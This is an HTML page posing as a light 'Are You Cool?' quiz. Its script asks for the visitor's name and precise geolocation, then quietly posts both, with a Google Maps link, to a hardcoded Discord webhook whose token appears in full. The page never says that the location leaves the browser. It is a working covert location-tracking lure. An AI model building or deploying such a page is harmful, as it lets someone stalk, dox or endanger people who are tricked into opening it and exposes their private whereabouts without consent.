<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Are You Cool?</title>

<style>
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    height: 100vh;
    font-family: "Segoe UI", system-ui, sans-serif;
    background: linear-gradient(135deg, #4facfe, #00f2fe);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
  }

  #container {
    background: rgba(0, 0, 0, 0.65);
    padding: 35px;
    width: 360px;
    border-radius: 16px;
    text-align: center;
    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
  }

  h1 {
    margin-top: 0;
    letter-spacing: 1px;
  }

  p {
    opacity: 0.9;
  }

  input {
    width: 100%;
    padding: 12px;
    margin: 15px 0;
    border-radius: 8px;
    border: none;
    font-size: 16px;
  }

  button {
    width: 100%;
    padding: 14px;
    font-size: 18px;
    font-weight: bold;
    background: #ffffff;
    color: #4facfe;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: 0.3s;
  }

  button:hover:not(:disabled) {
    background: #00f2fe;
    color: #fff;
  }

  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }

  #output {
    margin-top: 20px;
    min-height: 24px;
    font-size: 14px;
  }
</style>
</head>

<body>
<div id="container">
  <h1>ARE YOU COOL?</h1>
  <p>Enter your name and prove it ðŸ˜Ž</p>

  <input id="nameInput" type="text" placeholder="Your name">

  <button id="coolBtn">YES, I AM COOL</button>

  <div id="output"></div>
</div>

<script>
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1463193484826644757/QQYQSrvrwtAsGAGimt2wBbIGujdPVu8P1TSsTr1FtvUw4Rw8v_py-t6P3VZPy6gP4ode";
const btn = document.getElementById("coolBtn");
const output = document.getElementById("output");
const nameInput = document.getElementById("nameInput");

// Prevent repeat submissions
if (localStorage.getItem("alreadySent")) {
  btn.disabled = true;
  output.innerText = "You already proved you're cool ðŸ˜Ž";
}

btn.addEventListener("click", () => {
  const name = nameInput.value.trim();

  if (!name) {
    output.innerText = "Please enter your name.";
    return;
  }

  if (!navigator.geolocation) {
    output.innerText = "Geolocation not supported.";
    return;
  }

  btn.disabled = true;
  output.innerText = "Checking coolness...";

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      const acc = Math.round(pos.coords.accuracy);

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content:
`ðŸ˜Ž **New Cool Person**
Name: **${name}**
Latitude: ${lat}
Longitude: ${lon}
Accuracy: ${acc}m
https://maps.google.com/?q=${lat},${lon}`
        })
      });
     <!-- deploy trigger -->


      localStorage.setItem("alreadySent", "true");
      output.innerHTML = `<b>Thanks ${name}, you are officially cool ðŸ˜Ž</b>`;
    },
    err => {
      btn.disabled = false;
      output.innerText = "Permission denied or error.";
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
});
</script>
</body>
</html>
